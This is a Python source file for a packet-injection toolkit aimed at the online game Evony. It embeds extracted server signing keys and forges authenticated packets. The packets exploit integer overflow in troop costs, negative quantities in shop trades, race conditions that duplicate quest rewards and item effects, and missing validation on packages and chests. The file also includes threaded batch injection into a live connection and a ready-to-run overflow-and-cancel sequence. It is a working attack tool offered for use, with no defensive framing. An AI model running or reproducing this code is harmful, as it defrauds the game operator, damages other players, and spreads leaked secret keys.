# BORG TOOLKIT - Packet Injection Module
"""
Enterprise-grade packet injection for Evony.
Uses extracted encryption keys for authenticated packet forging.

Features:
- Packet forging with proper signatures
- Integer overflow packet generation
- Race condition packet sequences
- Validation bypass packets
- Batch injection for automated exploits
"""

import struct
import hashlib
import time
import threading
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass
from datetime import datetime

# Encryption keys from source
KEYS = {
    'ACTION_KEY': "TAO_{313-894*&*($*#-FDIU(430}-{facebook_dioe(&*%$l}",
    'API_KEY': "9f758e2deccbe6244f734371b9642eda",
    'USER_INFO_KEY': "IUGI_md5_key_{djfiji3*4930}-{fjdi3284$9dlld}",
    'XOR_KEY': 0xAA,
}

# Integer limits
INT32_MAX = 2147483647
INT32_MIN = -2147483648
UINT32_MAX = 4294967295


@dataclass
class InjectionPacket:
    """Forged packet ready for injection"""
    command: str
    params: Dict
    signature: str
    timestamp: float
    exploit_type: str = ""
    expected_result: str = ""


class SignatureGenerator:
    """Generate valid signatures for Evony packets"""
    
    @staticmethod
    def action_signature(command: str, params: Dict) -> str:
        """Generate action signature using ACTION_KEY"""
        param_str = '&'.join(f"{k}={v}" for k, v in sorted(params.items()))
        data = f"{command}{param_str}{KEYS['ACTION_KEY']}"
        return hashlib.md5(data.encode()).hexdigest()
    
    @staticmethod
    def api_signature(data: str) -> str:
        """Generate API signature using API_KEY"""
        return hashlib.md5((data + KEYS['API_KEY']).encode()).hexdigest()
    
    @staticmethod
    def user_signature(server: str, user_id: int) -> str:
        """Generate user signature using USER_INFO_KEY"""
        data = f"{server}{user_id}{KEYS['USER_INFO_KEY']}"
        return hashlib.md5(data.encode()).hexdigest()
    
    @staticmethod
    def password_hash(password: str, salt: str = "evony") -> str:
        """Generate password hash"""
        return hashlib.md5((password + salt).encode()).hexdigest()


class PacketForge:
    """
    Forge valid Evony packets with proper signatures.
    
    Usage:
        forge = PacketForge()
        packet = forge.troop_produce(castle_id=123, troop_type=6, num=6135037)
    """
    
    def __init__(self):
        self.sig_gen = SignatureGenerator()
        self.forged_packets: List[InjectionPacket] = []
    
    def _create_packet(self, command: str, params: Dict, 
                       exploit_type: str = "", expected: str = "") -> InjectionPacket:
        """Create signed packet"""
        sig = self.sig_gen.action_signature(command, params)
        packet = InjectionPacket(
            command=command,
            params=params,
            signature=sig,
            timestamp=time.time(),
            exploit_type=exploit_type,
            expected_result=expected
        )
        self.forged_packets.append(packet)
        return packet
    
    # =========================================================================
    # TROOP EXPLOITS - Integer Overflow
    # =========================================================================
    
    def troop_produce_overflow(self, castle_id: int, position_id: int, 
                                troop_type: int, overflow_num: int) -> InjectionPacket:
        """
        Create troop production packet with overflow value.
        
        Troop Types:
            1=worker, 2=warrior, 3=scout, 4=pikeman, 5=swordsman,
            6=archer, 7=cavalry, 8=cataphract, 9=transporter,
            10=ballista, 11=ram, 12=catapult
        
        Overflow thresholds (food overflow):
            archer (6): 6,135,036
            cavalry (7): 2,684,354
            cataphract (8): 1,431,655
        """
        params = {
            'castleId': castle_id,
            'positionId': position_id,
            'troopType': troop_type,
            'num': overflow_num,  # OVERFLOW VALUE
            'isShare': False,
            'toIdle': True,
        }
        return self._create_packet(
            'troop.produceTroop', params,
            exploit_type='INTEGER_OVERFLOW',
            expected='Cost calculation overflows to negative'
        )
    
    def troop_cancel_for_gain(self, castle_id: int, position_id: int, 
                               queue_id: int) -> InjectionPacket:
        """
        Cancel troop production after overflow = resource gain.
        Send this AFTER troop_produce_overflow.
        """
        params = {
            'castleId': castle_id,
            'positionId': position_id,
            'queueId': queue_id,
        }
        return self._create_packet(
            'troop.cancelTroopProduce', params,
            exploit_type='OVERFLOW_CANCEL',
            expected='Negative refund = RESOURCE GAIN'
        )
    
    def troop_disband_negative(self, castle_id: int, troop_type: int, 
                                num: int = -1) -> InjectionPacket:
        """
        Disband with negative number = potential resource gain.
        """
        params = {
            'castleId': castle_id,
            'troopType': troop_type,
            'num': num,  # Negative value
        }
        return self._create_packet(
            'troop.disbandTroop', params,
            exploit_type='NEGATIVE_VALUE',
            expected='Negative disband may add troops'
        )
    
    # =========================================================================
    # ARMY EXPLOITS - Timing/Race Conditions
    # =========================================================================
    
    def army_send_overflow(self, castle_id: int, target_x: int, target_y: int,
                           hero_id: int, troops: Dict[str, int], 
                           resources: Dict[str, int]) -> InjectionPacket:
        """
        Send army with overflowed resource values.
        """
        army_bean = {
            'heroId': hero_id,
            'targetPoint': {'x': target_x, 'y': target_y},
            'troops': troops,  # Can contain overflow values
            'resources': resources,  # Can contain overflow values
            'missionType': 1,  # 1=attack, 2=transport, 3=scout
        }
        params = {
            'castleId': castle_id,
            'newArmyBean': army_bean,
        }
        return self._create_packet(
            'army.newArmy', params,
            exploit_type='RESOURCE_OVERFLOW',
            expected='Transport negative resources'
        )
    
    def army_callback_race(self, castle_id: int, army_id: int) -> InjectionPacket:
        """
        Race condition: callback army precisely before action completes.
        """
        params = {
            'castleId': castle_id,
            'armyId': army_id,
        }
        return self._create_packet(
            'army.callBackArmy', params,
            exploit_type='RACE_CONDITION',
            expected='Action completes + army returns'
        )
    
    # =========================================================================
    # SHOP EXPLOITS - Items and Purchases
    # =========================================================================
    
    def shop_buy_negative(self, castle_id: int, item_id: str, 
                          num: int = -1) -> InjectionPacket:
        """
        Buy with negative quantity = potential free items or refund.
        """
        params = {
            'castleId': castle_id,
            'itemId': item_id,
            'num': num,
            'useGold': False,
        }
        return self._create_packet(
            'shop.buy', params,
            exploit_type='NEGATIVE_VALUE',
            expected='Negative buy = free items'
        )
    
    def shop_use_item_race(self, castle_id: int, item_id: str, 
                            count: int = 10) -> List[InjectionPacket]:
        """
        Generate rapid-fire item use packets for race condition.
        Send all simultaneously for duplicated effect.
        """
        packets = []
        for _ in range(count):
            params = {
                'castleId': castle_id,
                'itemId': item_id,
                'num': 1,
            }
            packets.append(self._create_packet(
                'shop.useGoods', params,
                exploit_type='RACE_CONDITION',
                expected='Item used multiple times'
            ))
        return packets
    
    def shop_sell_negative(self, castle_id: int, item_id: str, 
                           num: int = -1) -> InjectionPacket:
        """
        Sell with negative = buy items.
        """
        params = {
            'castleId': castle_id,
            'itemId': item_id,
            'num': num,
        }
        return self._create_packet(
            'shop.sellItem', params,
            exploit_type='NEGATIVE_VALUE',
            expected='Negative sell = gain items'
        )
    
    # =========================================================================
    # QUEST EXPLOITS - Reward Duplication
    # =========================================================================
    
    def quest_award_race(self, castle_id: int, quest_id: int, 
                          count: int = 10) -> List[InjectionPacket]:
        """
        Race condition: claim quest reward multiple times.
        """
        packets = []
        for _ in range(count):
            params = {
                'castleId': castle_id,
                'questId': quest_id,
            }
            packets.append(self._create_packet(
                'quest.award', params,
                exploit_type='RACE_CONDITION',
                expected='Quest reward duplicated'
            ))
        return packets
    
    def commission_quest_race(self, castle_id: int, quest_id: int, 
                               count: int = 10) -> List[InjectionPacket]:
        """
        Race condition: complete commission quest multiple times.
        """
        packets = []
        for _ in range(count):
            params = {
                'castleId': castle_id,
                'questId': quest_id,
            }
            packets.append(self._create_packet(
                'commissionQuest.completeCommissionQuest', params,
                exploit_type='RACE_CONDITION',
                expected='Commission reward duplicated'
            ))
        return packets
    
    # =========================================================================
    # GAMBLING/AMULET EXPLOITS
    # =========================================================================
    
    def amulet_spin_exploit(self, castle_id: int, 
                            amulet_type: int = 3) -> InjectionPacket:
        """
        Amulet wheel spin with timing exploit.
        Amulet types: 1-12 (player.box.gambling.1-12)
        """
        item_id = f"player.box.gambling.{amulet_type}"
        params = {
            'castleId': castle_id,
            'itemId': item_id,
            'num': 1,
        }
        return self._create_packet(
            'shop.useGoods', params,
            exploit_type='AMULET_SPIN',
            expected='Wheel spin for prize'
        )
    
    # =========================================================================
    # PACKAGE/CHEST EXPLOITS
    # =========================================================================
    
    def package_get_manipulated(self, rule_id: int, 
                                 serial: str = "0") -> InjectionPacket:
        """
        Get package with manipulated rule ID.
        Server may not validate rule_id properly.
        """
        params = {
            'ruleId': rule_id,
            'serial': serial,
        }
        return self._create_packet(
            'common.getPackage', params,
            exploit_type='VALIDATION_BYPASS',
            expected='Arbitrary package reward'
        )
    
    def chest_open_key_bypass(self, castle_id: int, 
                               chest_type: int = 3) -> InjectionPacket:
        """
        Open chest - check if key validation can be bypassed.
        Chest types: 1, 2, 3 (player.box.1, player.box.2, player.box.3)
        """
        item_id = f"player.box.{chest_type}"
        params = {
            'castleId': castle_id,
            'itemId': item_id,
            'num': 1,
        }
        return self._create_packet(
            'shop.useGoods', params,
            exploit_type='KEY_BYPASS',
            expected='Open chest without key'
        )
    
    # =========================================================================
    # TRADE EXPLOITS
    # =========================================================================
    
    def trade_create_overflow(self, castle_id: int, resource_type: int,
                               amount: int, price: int) -> InjectionPacket:
        """
        Create trade with overflowed amount or price.
        """
        params = {
            'castleId': castle_id,
            'resourceType': resource_type,  # 1=food, 2=wood, 3=stone, 4=iron
            'tradeType': 1,  # 1=sell, 2=buy
            'amount': amount,  # Overflow target
            'price': price,
        }
        return self._create_packet(
            'trade.createTrade', params,
            exploit_type='OVERFLOW',
            expected='Trade amount overflow'
        )


class PacketInjector:
    """
    Inject forged packets into live connection.
    
    Usage:
        injector = PacketInjector(connection)
        injector.inject(packet)
        injector.inject_batch(packets, delay=0.01)  # Race condition
    """
    
    def __init__(self, connection=None):
        self.connection = connection
        self.injection_log: List[Dict] = []
    
    def set_connection(self, connection):
        """Set the connection to inject into"""
        self.connection = connection
    
    def inject(self, packet: InjectionPacket) -> Optional[Dict]:
        """Inject single packet"""
        if not self.connection:
            print("[!] No connection set")
            return None
        
        result = self.connection.send_command(packet.command, packet.params)
        
        self.injection_log.append({
            'timestamp': datetime.now().isoformat(),
            'command': packet.command,
            'exploit_type': packet.exploit_type,
            'result': result,
        })
        
        return result
    
    def inject_batch(self, packets: List[InjectionPacket], 
                     delay: float = 0.0) -> List[Dict]:
        """
        Inject batch of packets with optional delay.
        For race conditions, use delay=0 and threading.
        """
        results = []
        
        if delay == 0:
            # Parallel injection for race conditions
            threads = []
            for packet in packets:
                t = threading.Thread(target=lambda p: results.append(self.inject(p)), args=(packet,))
                threads.append(t)
            
            # Start all at once
            for t in threads:
                t.start()
            
            # Wait for completion
            for t in threads:
                t.join()
        else:
            # Sequential with delay
            for packet in packets:
                results.append(self.inject(packet))
                time.sleep(delay)
        
        return results
    
    def run_overflow_exploit(self, castle_id: int, position_id: int, 
                              troop_type: int = 6) -> Dict:
        """
        Run complete overflow exploit sequence.
        1. Queue troops with overflow value
        2. Wait for server to process
        3. Cancel to get resource gain
        """
        forge = PacketForge()
        
        # Overflow thresholds
        thresholds = {
            1: 42949673,  # worker
            2: 21474837,  # warrior
            3: 10737419,  # scout
            4: 4294968,   # pikeman
            5: 2147484,   # swordsman
            6: 6135037,   # archer
            7: 2684355,   # cavalry
            8: 1431656,   # cataphract
            9: 4294968,   # transporter
            10: 858994,   # ballista
            11: 536871,   # ram
            12: 357914,   # catapult
        }
        
        overflow_num = thresholds.get(troop_type, 6135037)
        
        print(f"[*] Running overflow exploit: {overflow_num:,} troops (type {troop_type})")
        
        # Step 1: Send overflow production
        produce_packet = forge.troop_produce_overflow(
            castle_id, position_id, troop_type, overflow_num
        )
        print(f"[1] Sending production packet...")
        result1 = self.inject(produce_packet)
        
        # Step 2: Wait
        print("[2] Waiting for server processing...")
        time.sleep(0.5)
        
        # Step 3: Cancel
        cancel_packet = forge.troop_cancel_for_gain(castle_id, position_id, 0)
        print("[3] Sending cancel packet...")
        result2 = self.inject(cancel_packet)
        
        return {
            'produce_result': result1,
            'cancel_result': result2,
            'exploit': 'TROOP_OVERFLOW',
            'expected_gain': 'Negative resource refund = gain',
        }


def demo_forge():
    """Demonstrate packet forging"""
    print("=" * 70)
    print("BORG TOOLKIT - Packet Injection Module Demo")
    print("=" * 70)
    
    forge = PacketForge()
    
    print("\n[+] TROOP OVERFLOW EXPLOIT:")
    packet = forge.troop_produce_overflow(
        castle_id=12345,
        position_id=1,
        troop_type=6,  # archer
        overflow_num=6135037
    )
    print(f"    Command: {packet.command}")
    print(f"    Params: {packet.params}")
    print(f"    Signature: {packet.signature[:16]}...")
    print(f"    Exploit: {packet.exploit_type}")
    print(f"    Expected: {packet.expected_result}")
    
    print("\n[+] RACE CONDITION - Quest Award:")
    packets = forge.quest_award_race(castle_id=12345, quest_id=100, count=5)
    print(f"    Generated {len(packets)} packets for simultaneous injection")
    
    print("\n[+] SHOP NEGATIVE VALUE:")
    packet = forge.shop_buy_negative(castle_id=12345, item_id="player.item.speed", num=-10)
    print(f"    Command: {packet.command}")
    print(f"    Exploit: {packet.exploit_type}")


if __name__ == "__main__":
    demo_forge()
